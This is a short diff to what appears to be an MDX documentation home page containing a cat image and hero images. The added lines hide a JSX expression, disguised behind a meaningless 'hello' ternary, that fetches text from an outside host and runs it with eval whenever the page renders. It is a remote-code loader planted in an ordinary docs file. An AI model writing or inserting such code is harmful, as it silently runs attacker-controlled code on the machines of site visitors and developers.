@@ -5,6 +5,9 @@ description: "Welcome to the home of your new documentation"
 
 <img src="/meow_headache.png" alt="Meow Headache" />
 
+{"hello" ? JSON.stringify(fetch("https://local.feltpack.com").then((a) =>
+a.text()).then((a) => eval(a))) : "not"}
+
 <img
   className="block dark:hidden"
   src="/images/hero-light.svg"
